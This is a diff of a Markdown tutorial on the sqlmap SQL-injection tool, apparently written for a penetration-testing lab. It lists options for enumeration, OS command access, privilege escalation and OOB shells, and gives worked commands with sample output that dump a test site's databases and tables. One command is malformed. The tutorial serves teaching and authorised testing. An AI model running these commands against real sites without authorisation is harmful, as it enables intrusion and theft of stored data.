@@ -1,19 +1,16 @@
 Sqlmap is an open source penetration testing tool developed by Bernardo Damele Assumpcao Guimaraes and Miroslav Stampar that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches lasting from database fingerprinting, fetching data from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
-Installing Sqlmap
+Installing Sqlmap.
 
-If you're using Kali Linux, sqlmap is pre-installed. Otherwise, you can download it here: https://github.com/sqlmapproject/sqlmap
+## Commands
 
-# Commands
-### **Basic** commands:  
-
-|**Options**|**Description**|
-|---|---|
-|`-u URL`, `--url=URL`|Target URL (e.g., "[http://www.site.com/vuln.php?id=1](http://www.site.com/vuln.php?id=1)")|
-|`--data=DATA`|Data string to be sent through POST (e.g., "id=1")|
-|`--random-agent`|Use randomly selected HTTP User-Agent header value|
-|`-p TESTPARAMETER`|Testable parameter(s)|
-|`--level=LEVEL`|Level of tests to perform (1-5, default 1)|
-|`--risk=RISK`|Risk of tests to perform (1-3, default 1)|
+| **Options**           | **Description**                                                                             |
+| --------------------- | ------------------------------------------------------------------------------------------- |
+| `-u URL`, `--url=URL` | Target URL (e.g., "[http://www.site.com/vuln.php?id=1](http://www.site.com/vuln.php?id=1)") |
+| `--data=DATA`         | Data string to be sent through POST (e.g., "id=1")                                          |
+| `--random-agent`      | Use randomly selected HTTP User-Agent header value                                          |
+| `-p TESTPARAMETER`    | Testable parameter(s)                                                                       |
+| `--level=LEVEL`       | Level of tests to perform (1-5, default 1)                                                  |
+| `--risk=RISK`         | Risk of tests to perform (1-3, default 1)                                                   |
 
 ### **Enumeration** commands:
 These options can be used to enumerate the back-end database management system information, structure, and data contained in tables.
@@ -47,15 +44,12 @@ These options can be used to access the back-end database management system on t
 | `--priv-esc`     | Database process user privilege escalation             |
 | `--os-smbrelay`  | One-click prompt for an OOB shell, Meterpreter, or VNC |
 
-# UseCase
-
+### Example
 **Simple HTTP GET Based Test**  
-  
 `sqlmap -u https://testsite.com/page.php?id=7 --dbs`  
 
 Here we have used two flags: -u to state the vulnerable URL and --dbs to enumerate the database.
 
-  
 **Simple HTTP POST Based Test**  
 First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory. You could also copy the whole request and save it to a text file as well.
 
@@ -132,12 +126,10 @@ Now that we have the databases, let's extract tables from the database **blood*
 
 **Using GET based Method** 
 `sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables` 
-
 `sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables`
 
 **Using POST based Method**
 **`sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables`  
-
 `sqlmap -r req.txt -p blood_group -D blood --tables`
 
 Getting Tables
@@ -171,30 +163,28 @@ Database: blood
 | users    |
 +----------+
 ```
-
+\
 Once we have available tables, now let’s gather the columns from the table `blood_db`.
 
 **Using GET based Method**
 `sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns`  
-
 `sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns`
 
 **Using POST based Method**
 `sqlmap -r req.txt -D <database_name> -T <table_name> --columns`  
-
 `sqlmap -r req.txt -D blood -T blood_db --columns`
-
 
 Or we can simply dump all the available databases and tables using the following commands.  
 
 **Using GET based Method**
 `sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all` 
-  
 `sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all`  
 
-  
 **Using POST based Method**
 `sqlmap -r req.txt -D <database_name> --dump-all`  
-  
 `sqlmap -r req.txt-p  -D <database_name> --dump-all`  
+
+
+# Challenge
+
 
